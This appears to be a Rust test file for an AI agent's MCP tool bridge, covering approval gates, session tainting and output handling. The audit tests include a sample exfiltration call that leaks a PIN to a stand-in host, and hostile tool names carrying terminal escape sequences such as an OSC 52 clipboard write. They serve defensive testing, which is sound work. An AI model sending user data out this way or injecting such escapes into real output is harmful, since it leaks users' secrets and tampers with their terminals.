    fn context() -> ToolContext {
        ToolContext::new(
            Arc::new(InMemoryDataStore::new()),
            std::env::temp_dir(),
            Arc::new(SilentReporter),
        )
    }

    /// A fake that TAKES THE PLACE of an MCP tool without going on the network: it
    /// fills the `Tool` contract exactly as the real `MCPTool` does (the same name
    /// generation, the same `taints_session`), so the approval gate tests measure
    /// the real path.
    struct FakeMCPTool {
        name: String,
    }

    impl Tool for FakeMCPTool {
        fn name(&self) -> &str {
            &self.name
        }
        fn description(&self) -> &str {
            "Runs a command on a remote server."
        }
        fn schema(&self) -> ArgSchema {
            ArgSchema::object(vec![Field::new("command", ArgSchema::text()).required()])
        }
        // THE SAME ANSWERS AS `MCPTool` (audit H2-a): a fake that kept the old
        // `false` would let these gate tests pass against a tool that no longer
        // exists.
        fn taints_session(&self) -> bool {
            true
        }
        fn external_content(&self) -> bool {
            true
        }
        fn run<'a>(&'a self, _a: Value, _c: &'a mut ToolContext) -> ToolFuture<'a> {
            boxed(async move { ToolOutcome::read_ok("sent", "ok") })
        }
    }

    /// A personal-data tool — it taints the session.
    struct PersonalTool;
    impl Tool for PersonalTool {
        fn name(&self) -> &str {
            "calendar_read"
        }
        fn description(&self) -> &str {
            "Reads the calendar."
        }
        fn schema(&self) -> ArgSchema {
            ArgSchema::empty()
        }
        fn taints_session(&self) -> bool {
            true
        }
        fn run<'a>(&'a self, _a: Value, _c: &'a mut ToolContext) -> ToolFuture<'a> {
            boxed(async move { ToolOutcome::read_ok("read", "3 events") })
        }
    }

    fn mcp_catalog() -> (ToolCatalog, Vec<String>) {
        let name = build_tool_name("home server", "run_command");
        let mut catalog = ToolCatalog::new();
        catalog.add(Arc::new(PersonalTool));
        catalog.add(Arc::new(FakeMCPTool { name: name.clone() }));
        (catalog, vec![name])
    }

    // --- Name generation ---

    #[test]
    fn the_tool_name_is_produced_in_a_callable_form() {
        let name = build_tool_name("home server", "run-command");
        assert_eq!(name, "home_server_run_command");
        // The grammar and `ToolCall::parse` accept only this set.
        assert!(
            name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
            "{name}"
        );
    }

    #[test]
    fn turkish_and_consecutive_separators_collapse_into_one_underscore() {
        assert_eq!(
            build_tool_name("Work  Net", "get::info"),
            "work_net_get_info"
        );
    }

    #[test]
    fn the_same_tool_name_on_two_servers_does_not_collide() {
        assert_ne!(build_tool_name("ev", "run"), build_tool_name("is", "run"));
    }

    // --- The approval gate: is the mechanism REALLY triggered ---

    #[test]
    fn an_mcp_call_passes_unasked_in_a_clean_session() {
        // §3.3: in a session where no personal-data tool was touched, approval IS
        // NOT ASKED. An approval seen often stops being read; the gate's value is in
        // its rarity.
        let (catalog, names) = mcp_catalog();
        let executor = bind_executor(ToolExecutor::new(catalog), &names).with_gate(SilentDeny);
        let mut ctx = context();
        let ticket = executor.active_turn();

        let outcome = wait(executor.execute(
            &ToolCall::new(&names[0], json!({"command": "git pull"})),
            ticket,
            &mut ctx,
        ));
        assert_eq!(
            outcome.reason,
            ExecutionReason::Ok,
            "approval must not be asked in a clean session"
        );
    }

    #[test]
    fn an_mcp_call_in_a_tainted_session_hits_the_approval_gate() {
        // This was the gap of the first round: the gate existed, `EXTERNAL_TOOLS`
        // was empty, i.e. it could not be triggered. This test measures exactly that
        // wiring.
        let (catalog, names) = mcp_catalog();
        let executor = bind_executor(ToolExecutor::new(catalog), &names).with_gate(SilentDeny);
        let mut ctx = context();
        let ticket = executor.active_turn();

        // First personal data is read -> the session gets tainted.
        let first =
            wait(executor.execute(&ToolCall::new("calendar_read", json!({})), ticket, &mut ctx));
        assert_eq!(first.reason, ExecutionReason::Ok);
        assert!(
            executor.session_tainted(),
            "the personal tool should have tainted the session"
        );

        // Now the MCP call must hit the gate.
        let outcome = wait(executor.execute(
            &ToolCall::new(&names[0], json!({"command": "send the meeting"})),
            ticket,
            &mut ctx,
        ));
        assert_eq!(outcome.reason, ExecutionReason::ApprovalDenied);
        assert_eq!(outcome.state, ToolState::NeedsPermission);
        // A denial returns to the model as a NORMAL result, not as a malfunction
        // (§3.3).
        assert_eq!(outcome.to_model, DENIAL_MODEL_TEXT);
        assert!(
            !outcome.is_error(),
            "a denial is not a malfunction but the user's decision"
        );
    }

    #[test]
    fn the_call_passes_in_an_approved_tainted_session() {
        let (catalog, names) = mcp_catalog();
        let executor = bind_executor(ToolExecutor::new(catalog), &names).with_gate(AlwaysApprove);
        let mut ctx = context();
        let ticket = executor.active_turn();

        wait(executor.execute(&ToolCall::new("calendar_read", json!({})), ticket, &mut ctx));
        let outcome = wait(executor.execute(
            &ToolCall::new(&names[0], json!({"command": "send"})),
            ticket,
            &mut ctx,
        ));
        assert_eq!(outcome.reason, ExecutionReason::Ok);
    }

    #[test]
    fn an_unbound_mcp_tool_never_triggers_the_gate() {
        // The reason this test exists: "forgetting to wire it up" is a silent
        // security loss and the compiler does not catch it. Here it becomes visible.
        let (catalog, names) = mcp_catalog();
        let executor = ToolExecutor::new(catalog).with_gate(SilentDeny); // NOT BOUND
        let mut ctx = context();
        let ticket = executor.active_turn();

        wait(executor.execute(&ToolCall::new("calendar_read", json!({})), ticket, &mut ctx));
        let outcome = wait(executor.execute(
            &ToolCall::new(&names[0], json!({"command": "send"})),
            ticket,
            &mut ctx,
        ));
        assert_eq!(
            outcome.reason,
            ExecutionReason::Ok,
            "unbound, the data leaves without being asked — `bind_executor` is mandatory"
        );
    }

    /// A gate that records every approval asked: it measures both HOW MANY TIMES it
    /// was asked and WHAT was shown. It always denies.
    struct RegistryGate(std::sync::Mutex<Vec<String>>);

    impl crate::executor::ApprovalGate for Arc<RegistryGate> {
        fn request(&self, request: &crate::executor::ApprovalRequest) -> bool {
            self.0
                .lock()
                .expect("registry lock")
                .push(request.content.clone());
            false
        }
    }

    fn registry_gate() -> Arc<RegistryGate> {
        Arc::new(RegistryGate(std::sync::Mutex::new(Vec::new())))
    }

    #[test]
    fn a_second_approval_is_not_asked_in_the_same_session() {
        let (catalog, names) = mcp_catalog();
        let gate = registry_gate();
        let executor =
            bind_executor(ToolExecutor::new(catalog), &names).with_gate(Arc::clone(&gate));
        let mut ctx = context();
        let ticket = executor.active_turn();
        wait(executor.execute(&ToolCall::new("calendar_read", json!({})), ticket, &mut ctx));

        for _ in 0..3 {
            let o = wait(executor.execute(
                &ToolCall::new(&names[0], json!({"command": "send"})),
                ticket,
                &mut ctx,
            ));
            assert_eq!(o.reason, ExecutionReason::ApprovalDenied);
        }
        // §3.3: "ToolExecutor DOES NOT PRODUCE a second approval chip in the same
        // session" — the model cannot get into an insistence loop.
        assert_eq!(gate.0.lock().expect("registry lock").len(), 1);
    }

    #[test]
    fn the_content_shown_at_approval_is_the_real_payload() {
        let (catalog, names) = mcp_catalog();
        let gate = registry_gate();
        let executor =
            bind_executor(ToolExecutor::new(catalog), &names).with_gate(Arc::clone(&gate));
        let mut ctx = context();
        let ticket = executor.active_turn();
        wait(executor.execute(&ToolCall::new("calendar_read", json!({})), ticket, &mut ctx));
        wait(executor.execute(
            &ToolCall::new(&names[0], json!({"command": "tomorrow 14:00 meeting"})),
            ticket,
            &mut ctx,
        ));

        let seen = gate.0.lock().expect("registry lock").clone();
        assert_eq!(seen.len(), 1);
        // §3.3: the body is "the real content, not a category summary".
        assert!(seen[0].contains("tomorrow 14:00 meeting"), "{}", seen[0]);
    }

    // --- Catalog wiring ---

    #[test]
    fn feed_catalog_really_makes_the_tools_visible() {
        let mut outcome = LoadOutcome::default();
        outcome.tools.push(Arc::new(FakeMCPTool {
            name: build_tool_name("ev", "run"),
        }));

        let mut catalog = ToolCatalog::new();
        let names = feed_catalog(&mut catalog, &mut outcome);

        assert_eq!(names, vec!["ev_run".to_string()]);
        assert!(
            catalog.find("ev_run").is_some(),
            "it MUST BE VISIBLE in the catalog"
        );
        // THE EXPECTATION WAS INVERTED BY AUDIT H2-a. This line asserted the
        // tainting list stayed EMPTY ("an MCP tool is not a SOURCE of personal
        // data"), which is the behaviour the audit measured leaking a PIN code
        // to a web fetch. An MCP tool is on the list now.
        assert_eq!(catalog.tainting_tools(), vec!["ev_run"]);
    }

    /// A REMOTE NAME THAT COLLIDES WITH A BUILT-IN IS REFUSED, NOT PUSHED.
    ///
    /// `ToolCatalog::add` is a `Vec::push` and `find` returns the first match,
    /// and built-ins go in first everywhere in production. So a connection named
    /// `web` offering `search` produced `web_search`, which resolved forever to
    /// the built-in: the remote tool was uncallable, and where the two schemas
    /// happened to be compatible the model's arguments for the server ran
    /// against the built-in instead. Nothing said so — not a log line, not an
    /// error, not the tool list.
    #[test]
    fn a_remote_tool_cannot_shadow_a_name_the_catalog_already_has() {
        let mut catalog = ToolCatalog::new();
        catalog.add(Arc::new(FakeMCPTool {
            name: "web_search".to_string(),
        }));
        let builtin = Arc::clone(&catalog.tools()[0]);

        let mut outcome = LoadOutcome::default();
        outcome.tools.push(Arc::new(FakeMCPTool {
            name: build_tool_name("web", "search"),
        }));
        let names = feed_catalog(&mut catalog, &mut outcome);

        assert!(
            names.is_empty(),
            "a shadowing tool must not be reported as added: {names:?}"
        );
        assert_eq!(
            catalog.tools().len(),
            1,
            "the catalog must not hold two tools under one name"
        );
        assert!(
            Arc::ptr_eq(&catalog.tools()[0], &builtin),
            "the name must still resolve to the tool that had it"
        );
        assert_eq!(
            outcome.skipped.len(),
            1,
            "the clash has to be reported, or it is the silent swap again"
        );
        assert!(outcome.skipped[0].reason.contains("already taken"));
    }

    #[test]
    fn with_no_connection_the_load_is_empty_and_error_free() {
        // §2.1 off by default: with no connection the network is never touched, and
        // there is no error either.
        let outcome = load_from_config(&Config::default());
        assert!(outcome.tools.is_empty());
        assert!(outcome.connection_errors.is_empty());
        assert!(outcome.skipped.is_empty());
    }

    #[test]
    fn an_invalid_address_is_recorded_as_an_error_without_going_on_the_network() {
        let setting = ConnectionSetting {
            name: "bad".into(),
            url: "http://remote-server.example.com/mcp".into(),
            key: None,
            key_env: None,
            enabled: true,
            spec: None,
            auth: None,
            always_ask: false,
        };
        let outcome = load_connection(&setting);
        assert!(outcome.tools.is_empty());
        assert_eq!(outcome.connection_errors.len(), 1);
        assert_eq!(outcome.connection_errors[0].0, "bad");
    }

    // --- Output processing (the 4096 bypass) ---

    fn sample_tool() -> MCPTool {
        MCPTool::new(
            "ev_run",
            "run",
            "home server",
            "Runs a command.",
            ArgSchema::empty(),
            Arc::new(MCPClient::new("https://example.com/mcp", None).expect("client")),
        )
    }

    #[test]
    fn short_output_passes_as_is() {
        let ctx = context();
        let outcome = sample_tool().process_output(&ctx, "two files updated".into(), false);
        assert_eq!(outcome.to_model, "two files updated");
        assert!(outcome.chip_text.starts_with("home server · "));
    }

    #[test]
    fn long_output_is_not_dumped_on_the_model_and_goes_to_the_store() {
        let ctx = context();
        // Put a marker that occurs only at the end: let the tail rule be proven.
        let mut lines: Vec<String> = (0..500)
            .map(|i| format!("line {i} filler filler"))
            .collect();
        lines.push("ERROR: the build failed".into());
        let raw = lines.join("\n");

        let outcome = sample_tool().process_output(&ctx, raw.clone(), false);

        // Bulk data MUST NOT PASS to the model.
        assert!(
            !outcome.to_model.contains("line 10 filler"),
            "{}",
            outcome.to_model
        );
        assert!(outcome.to_model.len() < raw.len() / 4);
        // But the error lives in the tail (§5.5).
        assert!(outcome.to_model.contains("ERROR: the build failed"));
        // A single wire format: `source_ref_suffix`.
        assert!(
            outcome.to_model.contains("source_ref=mcp#1"),
            "{}",
            outcome.to_model
        );
        // All of it is in the store; the raw form also stands in the chip detail
        // (transparency).
        let record = ctx
            .from_store(&tacet_kernel::SourceRef("mcp#1".into()))
            .expect("must be in the store");
        assert_eq!(record.body, raw);
        assert_eq!(outcome.raw_output.as_deref(), Some(raw.as_str()));
    }

    #[test]
    fn the_servers_tool_error_is_explained_to_the_model_not_hidden_as_a_malfunction() {
        let ctx = context();
        let outcome = sample_tool().process_output(&ctx, "exit 1: no such file".into(), true);
        // `isError` is NOT a transport malfunction: the model must be able to read
        // it and explain it to the user.
        assert!(outcome.to_model.contains("no such file"));
        assert_ne!(outcome.to_model, ERROR_MODEL_TEXT);
        assert!(outcome.chip_text.contains("failed"));
    }

    #[test]
    fn empty_output_does_not_stay_silent() {
        let ctx = context();
        let outcome = sample_tool().process_output(&ctx, "   ".into(), false);
        assert_eq!(outcome.to_model, "tool returned no output");
    }

    /// THE LIVE PATH, NOT THE HELPER. `key_file_is_exposed` and `read_checked`
    /// were both written and both tested, and neither was reachable from the
    /// shell: `load_from_default` called plain `read_default`, so no user could
    /// ever see the warning. This test drives the SAME function the shell drives
    /// and demands the note come out of it — reverting `read_default_checked`
    /// back to `read_default` turns it red.
    ///
    /// IT GOES NOWHERE NEAR THE NETWORK: the connection is `enabled: false`, so
    /// `Config::valid()` is empty and nothing is dialled — while
    /// `key_file_is_exposed` still sees the plain key, because it reads every
    /// connection, not just the usable ones.
    #[cfg(unix)]
    #[test]
    fn a_world_readable_key_is_reported_on_the_path_the_shell_uses() {
        use std::os::unix::fs::PermissionsExt;

        let dir = std::env::temp_dir().join(format!(
            "tacet-mcp-exposure-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("mcp.json");
        std::fs::write(
            &path,
            r#"{"connections":[{"name":"home","url":"https://example.test/mcp",
               "key":"secret-token","enabled":false}]}"#,
        )
        .unwrap();

        // SAFETY: single-threaded intent — this variable is read only by
        // `config::default_path`, and this is the one test in the crate that
        // touches it.
        unsafe { std::env::set_var(tacet_mcp::config::PATH_VARIABLE, &path) };

        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
        let loud = load_from_default();
        assert!(
            loud.notes.iter().any(|n| n.contains("plain-text key")),
            "a 0644 file with a plain key produced no note: {:?}",
            loud.notes
        );
        // The remedy has to be in the text; a warning nobody can act on is noise.
        assert!(loud.notes.iter().any(|n| n.contains("chmod 600")));
        // The token itself MUST NOT be echoed to the screen while we complain
        // that other accounts can read it.
        assert!(!loud.notes.iter().any(|n| n.contains("secret-token")));

        // 0600 is the quiet case: the same file, narrowed, must say nothing.
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).unwrap();
        let quiet = load_from_default();
        assert!(
            quiet.notes.is_empty(),
            "a 0600 file still warned: {:?}",
            quiet.notes
        );

        unsafe { std::env::remove_var(tacet_mcp::config::PATH_VARIABLE) };
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_transport_error_goes_through_the_two_channels() {
        // A Turkish sentence to the user, FIXED English text to the model. Raw
        // `ureq` or server text MUST NOT LEAK to the model.
        let error = convert_error(&MCPError::Server("secret server trace".into()));
        let outcome = ToolOutcome::failed(&error);
        assert_eq!(outcome.to_model, ERROR_MODEL_TEXT);
        assert!(!outcome.to_model.contains("secret"));

        assert!(matches!(
            convert_error(&MCPError::Timeout),
            ToolError::Timeout
        ));
    }

    // --- Audit of 9 Oct 2026: H2-a (MCP taints), M14 (hostile strings) ---

    use tacet_mcp::transport::replay::{Canned, ReplayTransport};

    /// The REAL `MCPTool`, on a client whose transport replays `replies` — the
    /// bridge, the client and the executor all as the shell runs them, with no
    /// socket.
    fn replayed_tool(remote: &str, replies: Vec<Canned>) -> (MCPTool, Arc<ReplayTransport>) {
        let transport = Arc::new(ReplayTransport::new(replies));
        let client = MCPClient::new("https://mail.example.com/mcp", None)
            .expect("client")
            .with_transport(transport.clone());
        let tool = MCPTool::new(
            build_tool_name("mail", remote),
            remote,
            "mail",
            "Reads mail.",
            ArgSchema::object(vec![Field::new("query", ArgSchema::text())]),
            Arc::new(client),
        );
        (tool, transport)
    }

    fn call_reply(text: &str) -> Canned {
        Canned::ok(
            json!({"jsonrpc": "2.0", "id": 1, "result": {"content": [{"type": "text", "text": text}]}})
                .to_string(),
        )
    }

    /// A stand-in for `web_fetch`: an outbound tool that records whether it ran.
    struct Outbound(Arc<std::sync::atomic::AtomicBool>);
    impl Tool for Outbound {
        fn name(&self) -> &str {
            "web_fetch"
        }
        fn description(&self) -> &str {
            "Fetches a page."
        }
        fn schema(&self) -> ArgSchema {
            ArgSchema::object(vec![Field::new("url", ArgSchema::text()).required()])
        }
        fn run<'a>(&'a self, _a: Value, _c: &'a mut ToolContext) -> ToolFuture<'a> {
            self.0.store(true, std::sync::atomic::Ordering::SeqCst);
            boxed(async move { ToolOutcome::read_ok("fetched", "ok") })
        }
    }

    /// THE AUDIT'S HARNESS, ON THE REAL TOOL (H2-a): an MCP read returned a PIN,
    /// the session stayed clean, and `web_fetch https://x.test/?c=482913` ran
    /// with no question asked.
    #[test]
    fn an_mcp_result_taints_the_session_and_the_next_outbound_call_asks() {
        let (tool, _transport) =
            replayed_tool("read_inbox", vec![call_reply("PIN reset code 482913")]);
        let mcp_name = tool.name().to_string();
        let fetched = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let mut catalog = ToolCatalog::new();
        catalog.add(Arc::new(tool));
        catalog.add(Arc::new(Outbound(Arc::clone(&fetched))));
        let executor = bind_executor(ToolExecutor::new(catalog), std::slice::from_ref(&mcp_name))
            .external_tool("web_fetch")
            .with_gate(SilentDeny);
        let mut ctx = context();
        let ticket = executor.active_turn();

        let read = wait(executor.execute(
            &ToolCall::new(&mcp_name, json!({"query": "pin"})),
            ticket,
            &mut ctx,
        ));
        assert_eq!(read.reason, ExecutionReason::Ok, "{read:?}");
        assert!(read.to_model.contains("482913"));
        assert!(
            executor.session_tainted(),
            "a remote read is the user's data — the session must be tainted"
        );
        assert!(executor.saw_external_content());

        let leak = wait(executor.execute(
            &ToolCall::new("web_fetch", json!({"url": "https://x.test/?c=482913"})),
            ticket,
            &mut ctx,
        ));
        assert_eq!(leak.reason, ExecutionReason::ApprovalDenied);
        assert!(
            !fetched.load(std::sync::atomic::Ordering::SeqCst),
            "the code left the machine"
        );
    }

    /// `always_ask` turns ONE way: a connection can ask on every call, even the
    /// first of a clean session — and nothing in the file can switch the taint
    /// off.
    #[test]
    fn a_connection_can_be_made_stricter_and_never_looser() {
        let setting: ConnectionSetting = serde_json::from_value(json!({
            "name": "mail",
            "url": "https://mail.example.com/mcp",
            "always_ask": true,
            // Not a field: there is no knob to loosen with, so it is ignored.
            "taints_session": false,
            "external_content": false
        }))
        .expect("setting");
        let mut replies = vec![Canned::ok(
            json!({"jsonrpc": "2.0", "id": 1, "result": {"serverInfo": {"name": "m", "version": "1"}, "capabilities": {"tools": {}}}})
                .to_string(),
        )];
        replies.push(Canned::ok(
            json!({"jsonrpc": "2.0", "id": 1, "result": {"tools": [
                {"name": "read_inbox", "description": "Reads.", "inputSchema": {"type": "object", "properties": {}}}
            ]}})
            .to_string(),
        ));
        let loaded = load_connection_over(
            &setting,
            Arc::new(tacet_mcp::DeclineInput),
            Arc::new(ReplayTransport::new(replies)),
        );
        assert!(
            loaded.connection_errors.is_empty(),
            "{:?}",
            loaded.connection_errors
        );
        let tool = Arc::clone(&loaded.tools[0]);
        assert!(tool.always_asks());
        assert!(tool.taints_session() && tool.external_content());

        let name = tool.name().to_string();
        let catalog: ToolCatalog = [tool].into_iter().collect();
        let executor = bind_executor(ToolExecutor::new(catalog), std::slice::from_ref(&name))
            .with_gate(SilentDeny);
        let mut ctx = context();
        let first = wait(executor.execute(
            &ToolCall::new(&name, json!({})),
            executor.active_turn(),
            &mut ctx,
        ));
        assert_eq!(
            first.reason,
            ExecutionReason::ApprovalDenied,
            "always_ask asks even in a clean session"
        );

        // And the default stays quiet in a clean session.
        let plain: ConnectionSetting =
            serde_json::from_value(json!({"name": "mail", "url": "https://mail.example.com/mcp"}))
                .expect("setting");
        assert!(!plain.always_ask);
    }

    fn has_control(text: &str) -> bool {
        text.chars().any(char::is_control)
    }

    /// M14: what a hostile server can put into the load report, measured on the
    /// path the shell prints from every start.
    #[test]
    fn a_hostile_servers_names_and_types_reach_the_report_without_escapes() {
        let setting: ConnectionSetting = serde_json::from_value(json!({
            "name": "evil",
            "url": "https://evil.example.com/mcp",
            "spec": "x\u{1b}]52;c;Zm9v\u{7}"
        }))
        .expect("setting");
        let replies = vec![
            Canned::ok(
                json!({"jsonrpc": "2.0", "id": 1, "result": {"serverInfo": {"name": "e", "version": "1"}, "capabilities": {"tools": {}}}})
                    .to_string(),
            ),
            Canned::ok(
                json!({"jsonrpc": "2.0", "id": 1, "result": {"tools": [
                    // A dropped constraint: the note quotes the tool's name.
                    {"name": "y\u{1b}[31mRED", "description": "d\u{1b}[2J", "inputSchema": {
                        "type": "object",
                        "properties": {"q": {"type": "string", "pattern": "^a"}}}},
                    // An unconvertible type: the skip reason quotes the type.
                    {"name": "z\u{9b}31m", "description": "d", "inputSchema": {
                        "type": "object",
                        "properties": {"q": {"type": "\u{1b}[5mBLINK"}}}}
                ]}})
                .to_string(),
            ),
        ];
        let loaded = load_connection_over(
            &setting,
            Arc::new(tacet_mcp::DeclineInput),
            Arc::new(ReplayTransport::new(replies)),
        );
        assert!(
            loaded.connection_errors.is_empty(),
            "{:?}",
            loaded.connection_errors
        );
        assert!(!loaded.notes.is_empty(), "the fixture must produce notes");
        assert!(
            !loaded.skipped.is_empty(),
            "the fixture must produce a skip"
        );
        for note in &loaded.notes {
            assert!(!has_control(note), "a note carries an escape: {note:?}");
        }
        for skipped in &loaded.skipped {
            for text in [&skipped.connection, &skipped.remote_name, &skipped.reason] {
                assert!(!has_control(text), "a skip carries an escape: {text:?}");
            }
        }
        for tool in &loaded.tools {
            assert!(!has_control(tool.description()), "{:?}", tool.description());
        }
    }

    /// The chip a hostile remote name lands on (M14): `remote_name` itself stays
    /// byte-exact for `tools/call`, the screen gets the clean label.
    #[test]
    fn a_hostile_remote_name_does_not_reach_the_chip() {
        let hostile = "run\u{1b}[2J\u{1b}[H";
        let (tool, transport) = replayed_tool(hostile, vec![call_reply("done")]);
        let mut ctx = context();
        let outcome = wait(tool.run(json!({}), &mut ctx));
        assert!(!has_control(&outcome.chip_text), "{:?}", outcome.chip_text);
        let sent: Value = serde_json::from_slice(&transport.sent()[0].body).expect("json");
        assert_eq!(
            sent["params"]["name"], hostile,
            "the call must name the tool as given"
        );
    }
}
